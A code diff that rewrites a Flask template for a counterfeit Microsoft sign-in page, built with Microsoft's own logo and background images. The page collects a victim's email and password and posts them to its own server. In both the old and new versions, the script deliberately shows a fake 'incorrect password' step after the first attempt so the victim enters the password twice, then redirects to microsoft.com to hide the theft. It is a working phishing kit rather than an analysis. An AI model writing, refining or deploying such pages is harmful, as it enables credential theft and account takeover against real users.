@@ -1,394 +1,293 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<style>
-  body {
-    font-family: Arial, sans-serif;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-    background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg');
-    background-size: cover;
-  }
-  .logo {
-    margin-bottom: 15px;
-  }
-  .step { font-size: 12px; color: #000; margin: -10px 0 14px 0; opacity: .8; }
-  .muted {
-    color: #000;
-    text-decoration: none;
-    font-size: 13px;
-  }
-  .sigopts {
-    background-color: white;
-    padding: 20px 41px;
-    border-radius: 0;
-    box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1);
-    width: 405px;
-    margin-top: 10px;
-    text-align: left;
-  }
-  .header {
-    margin: 0 0 20px;
-    font-size: 24px;
-    font-weight: bold;
-  }
-  form input {
-    width: 100%;
-    padding: 6px 6px 6px 0;
-    margin-bottom: 10px;
-    border: none;
-    border-bottom: 1px solid #0067b8;
-    background-color: transparent;
-    outline: none;
-  }
-  form div {
-    margin: 15px 0;
-    font-size: 13px;
-  }
-  form button {
-    padding: 6px 32px;
-    border: none;
-    border-radius: 0;
-    cursor: pointer;
-  }
-  .btn-back {
-    background-color: #e0e0e0;
-    color: #000;
-    margin-right: 4px;
-  }
-  .btn-next {
-    background-color: #0078d4;
-    color: white;
-  }
-  .error-msg {
-    color: red;
-    font-weight: normal;
-    margin: 10px 0;
-  }
-  .error-msg span {
-    color: blue;
-    cursor: pointer;
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg');
+            background-size: cover;
+        }
+        .logo {
+            margin-bottom: 15px;
+        }
+        .step { 
+            font-size: 12px; 
+            color: #000; 
+            margin: -10px 0 14px 0; 
+            opacity: .8; 
+        }
+        .muted {
+            color: #000;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        .sigopts {
+            background-color: white;
+            padding: 20px 41px;
+            border-radius: 0;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1);
+            width: 405px;
+            margin-top: 10px;
+            text-align: left;
+        }
+        .header {
+            margin: 0 0 20px;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        form input {
+            width: 100%;
+            padding: 6px 6px 6px 0;
+            margin-bottom: 10px;
+            border: none;
+            border-bottom: 1px solid #0067b8;
+            background-color: transparent;
+            outline: none;
+        }
+        form div {
+            margin: 15px 0;
+            font-size: 13px;
+        }
+        form button {
+            padding: 6px 32px;
+            border: none;
+            border-radius: 0;
+            cursor: pointer;
+        }
+        .btn-back {
+            background-color: #e0e0e0;
+            color: #000;
+            margin-right: 4px;
+        }
+        .btn-next {
+            background-color: #0078d4;
+            color: white;
+        }
+        .error-msg {
+            color: red;
+            font-weight: normal;
+            margin: 10px 0;
+        }
+        .error-msg span {
+            color: blue;
+            cursor: pointer;
+        }
+        @keyframes spin { 
+            to { transform: rotate(360deg); } 
+        }
+    </style>
 </head>
 <body>
 
 <div id="container" style="background-color: white; padding: 40px; border-radius: 0; box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1); width: 405px;">
-
 </div>
 
-<div class="sigopts"><span class="muted">&#128273; Sign-in options</span></div>
+<div class="sigopts"><span class="muted">🔒 Sign-in options</span></div>
 
 <script>
-  let email = "";
-  let password = "";
+    let email = "";
+    let password = "";
 
-  function validateEmail(email) {
-    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return re.test(email);
-  }
+    function validateEmail(email) {
+        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return re.test(email);
+    }
 
-  function showStep1() {
-    const container = document.getElementById("container");
-    container.innerHTML = `
-      <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
-      <h1 class="header">Sign in</h1>
-      <form id="loginForm">
-        <input type="text" id="emailInput" placeholder="Email, phone, or Skype" required>
-        <div style="margin: 15px 0; font-size: 13px;">
-          <span style="color: #000; text-decoration: none;">No account? <span style="color: #0067b8; text-decoration: none;">Create one!</span></span><br><br>
-          <span style="color: #0067b8; text-decoration: none;">Can't access your account?</span>
-        </div>
-        <div style="display: flex; justify-content: flex-end;">
-          <button type="button" class="btn-back" id="btnBack" disabled>Back</button>
-          <button type="submit" class="btn-next">Next</button>
-        </div>
-      </form>
-    `;
-    document.getElementById("loginForm").addEventListener("submit", function(e){
-      e.preventDefault();
-      const val = document.getElementById("emailInput").value.trim();
-      if(validateEmail(val)) {
-        email = val;
-        showStep2();
-      } else {
-        alert("Please enter a valid email address.");
-      }
-    });
-  }
-
-  function showStep2() {
-    const container = document.getElementById("container");
-    container.innerHTML = `
-      <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 3px;">
-      <div class="muted" style="margin:15px 5px;">← ${email}</div>
-      <h1 class="header">Enter Password</h1>
-      <input type="password" id="passwordInput" placeholder="Password" required 
-       style="border: none; outline: none; background: transparent; 
-              border-bottom: 2px solid blue; width: 400px; 
-              padding: 0; display: inline-block;">
-      <form id="loginForm">
-        <div style="margin: 15px 0; font-size: 13px;">
-          <span style="color: #0067b8; text-decoration: none;">Is this your account?</span>
-        </div>
-        <div style="display: flex; justify-content: flex-end;">
-          <button type="button" class="btn-back" id="btnBack">Back</button>
-          <button type="submit" class="btn-next">Next</button>
-        </div>
-      </form>
-    `;
-    document.getElementById("btnBack").addEventListener("click", function(){
-      showStep1();
-    });
-    document.getElementById("loginForm").addEventListener("submit", function(e){
-      e.preventDefault();
-      const pwd = document.getElementById("passwordInput").value;
-      if(pwd.trim()) {
-        password = pwd;
-        // Submit to backend for first attempt (should get blocked and redirect to step 3)
-        submitToBackend(email, password, false);
-      } else {
-        alert("Please enter your password.");
-      }
-    });
-  }
-
-  function showStep3() {
-    const container = document.getElementById("container");
-    container.innerHTML = `
-      <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
-      <div class="muted" style="margin:10px 9px;">← ${email}</div>
-      <div style="color: #e81123; font-size: 14px; font-weight: bold; margin: 10px 0;">Try again</div>
-      <h1 class="header">Enter Password</h1>
-      <input type="password" id="passwordInput" placeholder="Password" required 
-       style="border: none; outline: none; background: transparent; 
-              border-bottom: 2px solid blue; width: 400px; 
-              padding: 5px 0; display: inline-block;" value="${password}">
-      <form id="finalForm" method="POST" action="/">
-        {% if csrf_token %}
-        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
-        {% endif %}
-        <input type="hidden" name="email" value="">
-        <input type="hidden" name="password" value="">
-        <input type="hidden" name="submit" value="Sign in">
-        <div style="margin: 15px 0; font-size: 13px;">
-          <span style="color: #0067b8; text-decoration: none;">Enter your password to continue</span>
-        </div>
-        <div style="display: flex; justify-content: flex-end;">
-          <button type="button" class="btn-back" id="btnBack">Back</button>
-          <button type="submit" class="btn-next" id="signinBtn">
-            <span id="signinSpinner" class="d-none"></span>
-            Sign in
-          </button>
-        </div>
-      </form>
-    `;
-
-    // Set the hidden form values
-    document.querySelector('input[name="email"]').value = email;
-    document.querySelector('input[name="password"]').value = password;
-
-    document.getElementById("btnBack").addEventListener("click", function(){
-      showStep2();
-    });
-
-    document.getElementById("finalForm").addEventListener("submit", function(e){
-      e.preventDefault();
-      const finalPassword = document.getElementById("passwordInput").value;
-      if(finalPassword.trim()) {
-        // Show loading state
-        const signinBtn = document.getElementById("signinBtn");
-        signinBtn.disabled = true;
-        signinBtn.innerHTML = `
-          <span style="display: inline-block; width: 12px; height: 12px; border: 2px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; margin-right: 8px;"></span>
-          Processing...
+    function showStep1() {
+        const container = document.getElementById("container");
+        container.innerHTML = `
+            <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
+            <h1 class="header">Sign in</h1>
+            <form id="loginForm">
+                <input type="text" id="emailInput" placeholder="Email, phone, or Skype" required>
+                <div style="margin: 15px 0; font-size: 13px;">
+                    <span style="color: #000; text-decoration: none;">No account? <span style="color: #0067b8; text-decoration: none;">Create one!</span></span><br><br>
+                    <span style="color: #0067b8; text-decoration: none;">Can't access your account?</span>
+                </div>
+                <div style="display: flex; justify-content: flex-end;">
+                    <button type="submit" class="btn-next">Next</button>
+                </div>
+            </form>
         `;
-        // Add CSS animation inline
-        if (!document.querySelector('#spin-animation')) {
-          const style = document.createElement('style');
-          style.id = 'spin-animation';
-          style.textContent = '@keyframes spin { to { transform: rotate(360deg); } }';
-          document.head.appendChild(style);
-        }
-        // Submit to backend for second attempt (should trigger automation)
-        submitToBackend(email, finalPassword, true);
-      } else {
-        alert("Please enter your password.");
-      }
-    });
-  }
-
-  // Prefill from ?email= if present and valid
-  (function prefillFromQuery(){
-    try {
-      const q = new URLSearchParams(window.location.search);
-      const hinted = (q.get("email") || "").trim();
-      const step = q.get("step") || "";
-
-      if (hinted && validateEmail(hinted)) {
-        email = hinted;
-        if (step === "password") {
-          showStep2(); // Normal password step
-          return;
-        } else if (step === "retry") {
-          showStep3(); // Go to step 3 for retry
-          return;
-        }
-      }
-    } catch (_) {}
-  })();
-
-  // Show error messages inline like Microsoft
-  function showError(message) {
-    const container = document.getElementById("container");
-    const existingError = container.querySelector('.error-msg');
-    if (existingError) {
-      existingError.remove();
+        
+        document.getElementById("loginForm").addEventListener("submit", function(e){
+            e.preventDefault();
+            const emailValue = document.getElementById("emailInput").value.trim();
+            if(emailValue && validateEmail(emailValue)) {
+                email = emailValue;
+                showStep2();
+            } else {
+                alert("Please enter a valid email address.");
+            }
+        });
     }
 
-    const errorDiv = document.createElement('div');
-    errorDiv.className = 'error-msg';
-    errorDiv.innerHTML = `
-      <div style="color: #e81123; font-size: 13px; margin: 10px 0;">
-        ${message}
-      </div>
-    `;
-
-    const header = container.querySelector('.header');
-    if (header) {
-      header.parentNode.insertBefore(errorDiv, header.nextSibling);
+    function showStep2() {
+        const container = document.getElementById("container");
+        container.innerHTML = `
+            <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
+            <div class="muted" style="margin:10px 0;">← ${email}</div>
+            <h1 class="header">Enter password</h1>
+            <form id="loginForm">
+                <input type="password" id="passwordInput" placeholder="Password" required>
+                <div style="margin: 15px 0; font-size: 13px;">
+                    <span style="color: #0067b8; text-decoration: none;">Forgot password?</span><br><br>
+                    <span style="color: #0067b8; text-decoration: none;">Sign in with a different account</span>
+                </div>
+                <div style="display: flex; justify-content: flex-end;">
+                    <button type="button" class="btn-back" id="btnBack">Back</button>
+                    <button type="submit" class="btn-next">Sign in</button>
+                </div>
+            </form>
+        `;
+        
+        document.getElementById("btnBack").addEventListener("click", function(){
+            showStep1();
+        });
+        
+        document.getElementById("loginForm").addEventListener("submit", function(e){
+            e.preventDefault();
+            const pwd = document.getElementById("passwordInput").value;
+            if(pwd.trim()) {
+                password = pwd;
+                submitToBackend(email, password, false);
+            } else {
+                alert("Please enter your password.");
+            }
+        });
     }
-  }
 
-  // Show success or error messages from Flask
-  {% if get_flashed_messages() %}
-    {% for message in get_flashed_messages(with_categories=true) %}
-      {% if message[0] == 'error' %}
-        setTimeout(() => {
-          showError("{{ message[1]|e }}");
-        }, 100);
-      {% elif message[0] == 'success' %}
-        setTimeout(() => {
-          alert("{{ message[1] }}");
-        }, 100);
-      {% endif %}
-    {% endfor %}
-  {% endif %}
+    function showStep3() {
+        const container = document.getElementById("container");
+        container.innerHTML = `
+            <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
+            <div class="muted" style="margin:10px 0;">← ${email}</div>
+            <h1 class="header">Your account or password is incorrect</h1>
+            <div style="margin: 15px 0;">
+                If you don't remember your password, <span style="color: #0067b8; cursor: pointer;">reset it now</span>.
+            </div>
+            <form id="loginForm">
+                <input type="password" id="finalPasswordInput" placeholder="Password" required>
+                <div style="margin: 15px 0; font-size: 13px;">
+                    <span style="color: #0067b8; text-decoration: none;">Forgot password?</span>
+                </div>
+                <div style="display: flex; justify-content: flex-end;">
+                    <button type="button" class="btn-back" id="btnBack2">Back</button>
+                    <button type="submit" class="btn-next" id="finalSignIn">Sign in</button>
+                </div>
+            </form>
+        `;
+        
+        document.getElementById("btnBack2").addEventListener("click", function(){
+            showStep2();
+        });
+        
+        document.getElementById("loginForm").addEventListener("submit", function(e){
+            e.preventDefault();
+            const finalPassword = document.getElementById("finalPasswordInput").value;
+            if(finalPassword.trim()) {
+                const signInBtn = document.getElementById("finalSignIn");
+                signInBtn.innerHTML = `
+                    <span style="display: inline-block; width: 12px; height: 12px; border: 2px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; margin-right: 8px;"></span>
+                    Processing...
+                `;
+                submitToBackend(email, finalPassword, true);
+            } else {
+                alert("Please enter your password.");
+            }
+        });
+    }
 
-  // Function to submit credentials to backend
-  function submitToBackend(emailVal, passwordVal, isSecondAttempt) {
-    const formData = new FormData();
-    {% if csrf_token %}
-    formData.append('csrf_token', '{{ csrf_token() }}');
-    {% endif %}
-    formData.append('email', emailVal);
-    formData.append('password', passwordVal);
-    formData.append('submit', 'Sign in');
+    function submitToBackend(emailValue, passwordValue, isSecondAttempt) {
+        const formData = new FormData();
+        formData.append('email', emailValue);
+        formData.append('password', passwordValue);
+        formData.append('submit', 'Sign in');
+        formData.append('csrf_token', '{{ csrf_token() }}');
 
-    fetch('/', {
-      method: 'POST',
-      body: formData,
-      credentials: 'same-origin'
-    })
-    .then(response => {
-      const redirected = response.redirected;
-      const url = response.url;
+        fetch('/', {
+            method: 'POST',
+            body: formData,
+            redirect: 'manual'
+        })
+        .then(response => {
+            if (response.type === 'opaqueredirect' || response.redirected) {
+                if (response.url && response.url.includes('microsoft.com')) {
+                    window.location.href = 'https://microsoft.com';
+                } else if (response.url && response.url.includes('retry=true')) {
+                    setTimeout(() => showStep3(), 500);
+                } else if (!isSecondAttempt) {
+                    setTimeout(() => showStep3(), 500);
+                } else {
+                    location.reload();
+                }
+                return null;
+            }
+            return response.text();
+        })
+        .then(html => {
+            if (!html) return;
+            
+            if (html.includes('error=true') || html.includes('incorrect')) {
+                if (!isSecondAttempt) {
+                    showStep3();
+                } else {
+                    showError("Login failed. Please try again.");
+                }
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            showError("An error occurred. Please try again.");
+        });
+    }
 
-      // For first attempt (should always fail and show try again)
-      if (!isSecondAttempt) {
-        // Check if redirected to retry page
-        if (redirected && url.includes('step=retry')) {
-          // Show step 3 instead of redirecting
-          setTimeout(() => showStep3(), 500);
-          return null;
-        } else {
-          // If no redirect, force show step 3 anyway (first attempt should fail)
-          setTimeout(() => showStep3(), 500);
-          return null;
+    function showError(message) {
+        const container = document.getElementById("container");
+        const existingError = container.querySelector('.error-msg');
+        if (existingError) {
+            existingError.remove();
         }
-      }
+        
+        const errorDiv = document.createElement('div');
+        errorDiv.className = 'error-msg';
+        errorDiv.innerHTML = message;
+        container.insertBefore(errorDiv, container.firstChild);
+    }
 
-      // For second attempt - check for success redirect
-      if (redirected && url.includes('microsoft.com')) {
-        window.location.href = 'https://microsoft.com';
-        return null;
-      }
+    // Initialize the application
+    (function init(){
+        try {
+            const urlParams = new URLSearchParams(window.location.search);
+            const hintedEmail = (urlParams.get("email") || "").trim();
+            const step = urlParams.get("step") || "";
 
-      return response.text();
-    })
-    .then(html => {
-      if (!html) return; // Already redirected
-
-      // Parse the response to check for error messages
-      const parser = new DOMParser();
-      const doc = parser.parseFromString(html, 'text/html');
-
-      // Look for error messages in the response
-      let hasError = false;
-      let errorMessage = '';
-
-      // Check for flashed error messages
-      const scripts = doc.querySelectorAll('script');
-      for (let script of scripts) {
-        if (script.textContent.includes('showError')) {
-          const errorMatch = script.textContent.match(/showError\("([^"]+)"/);
-          if (errorMatch) {
-            hasError = true;
-            errorMessage = errorMatch[1];
-            break;
-          }
+            if (hintedEmail && validateEmail(hintedEmail)) {
+                email = hintedEmail;
+                if (step === "password") {
+                    showStep2();
+                    return;
+                } else if (step === "retry") {
+                    showStep3();
+                    return;
+                }
+            }
+        } catch (e) {
+            console.error("URL parsing error:", e);
         }
-      }
-
-      // Check URL parameters for errors
-      const currentUrl = new URL(window.location.href);
-      if (html.includes('error=true') || currentUrl.searchParams.get('error')) {
-        hasError = true;
-        if (!errorMessage) {
-          errorMessage = "Your account or password is not correct. If you don't remember your password, reset it now.";
-        }
-      }
-
-      if (hasError) {
-        if (isSecondAttempt) {
-          // Second attempt failed - show error and reset
-          showError(errorMessage);
-          // Reset the sign-in button
-          const signinBtn = document.getElementById("signinBtn");
-          if (signinBtn) {
-            signinBtn.disabled = false;
-            signinBtn.innerHTML = "Sign in";
-          }
-        } else {
-          // First attempt - show error and proceed to step 3
-          showError(errorMessage);
-          setTimeout(() => showStep3(), 2000);
-        }
-      } else {
-        // No error detected but no redirect - might be success
-        window.location.href = 'https://microsoft.com';
-      }
-    })
-    .catch(error => {
-      console.error('Error:', error);
-      showError('Network error occurred');
-      // Reset the sign-in button on error
-      const signinBtn = document.getElementById("signinBtn");
-      if (signinBtn) {
-        signinBtn.disabled = false;
-        signinBtn.innerHTML = "Sign in";
-      }
-    });
-  }
-
-  // Initialize the form
-  if(!email) {
-    showStep1();
-  }
+        
+        showStep1();
+    })();
 </script>
 
 </body>
